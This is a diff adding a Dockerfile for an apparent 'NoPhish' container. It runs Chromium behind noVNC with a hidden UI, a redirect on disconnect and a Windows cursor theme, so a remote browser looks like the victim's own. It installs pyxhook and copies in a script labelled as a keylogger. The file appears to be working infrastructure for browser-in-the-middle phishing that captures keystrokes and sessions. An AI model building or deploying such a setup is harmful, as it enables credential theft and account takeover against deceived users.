@@ -1,0 +1,67 @@
+# Chrome Desktop VNC - Alpine-based with Xvfb + x11vnc + websockify + openbox + chromium
+FROM alpine:3.19.1
+
+LABEL description="NoPhish Chrome Desktop VNC Container"
+
+# Environment
+ENV VNC_PASS="changeme" \
+    VNC_RESOLUTION="1920x1080" \
+    DISPLAY=:0 \
+    LANG=en_US.UTF-8 \
+    LANGUAGE=en_US.UTF-8 \
+    LC_ALL=C.UTF-8
+
+# Install system dependencies
+RUN apk update && \
+    apk add --no-cache \
+    bash supervisor curl wget \
+    xvfb x11vnc xsetroot xdpyinfo \
+    openbox \
+    chromium nss alsa-lib \
+    font-noto font-noto-cjk font-noto-emoji \
+    python3 py3-pip py3-xlib \
+    && rm -rf /var/cache/apk/*
+
+# Install websockify and pyxhook via pip
+RUN pip3 install --break-system-packages websockify pyxhook
+
+# Download noVNC (modern version with ES module support)
+RUN wget -qO /tmp/novnc.tar.gz https://github.com/novnc/noVNC/archive/refs/tags/v1.5.0.tar.gz && \
+    tar xzf /tmp/novnc.tar.gz -C /opt/ && \
+    mv /opt/noVNC-1.5.0 /opt/novnc && \
+    rm /tmp/novnc.tar.gz
+
+# Remove default noVNC favicon
+RUN rm -f /opt/novnc/app/images/icons/novnc*.ico 2>/dev/null || true
+
+# Copy our customized noVNC files (hidden UI, redirect on disconnect)
+COPY ./vnc/conn.html /opt/novnc/conn.html
+COPY ./vnc/ui.js /opt/novnc/app/ui.js
+COPY ./vnc/base.css /opt/novnc/app/styles/base.css
+
+# Copy Windows cursor theme for desktop
+COPY ./vnc/WinCursor /usr/share/icons/WinCursor/
+
+# Set up cursor theme
+RUN mkdir -p /root/.icons/default && \
+    echo "[Icon Theme]" > /root/.icons/default/index.theme && \
+    echo "Inherits=WinCursor" >> /root/.icons/default/index.theme
+
+# Copy keylogger
+COPY ./vnc/logger.py /opt/logger.py
+
+# Copy supervisor configs
+COPY ./chrome-novnc/nophish/supervisord.conf /etc/supervisord.conf
+COPY ./chrome-novnc/nophish/01-xvfb.conf /etc/supervisor/conf.d/
+COPY ./chrome-novnc/nophish/02-openbox.conf /etc/supervisor/conf.d/
+COPY ./chrome-novnc/nophish/03-background.conf /etc/supervisor/conf.d/
+COPY ./chrome-novnc/nophish/04-x11vnc.conf /etc/supervisor/conf.d/
+COPY ./chrome-novnc/nophish/05-websockify.conf /etc/supervisor/conf.d/
+
+# Create log directory
+RUN mkdir -p /var/log
+
+EXPOSE 6901
+
+ENTRYPOINT ["supervisord", "-c"]
+CMD ["/etc/supervisord.conf"]
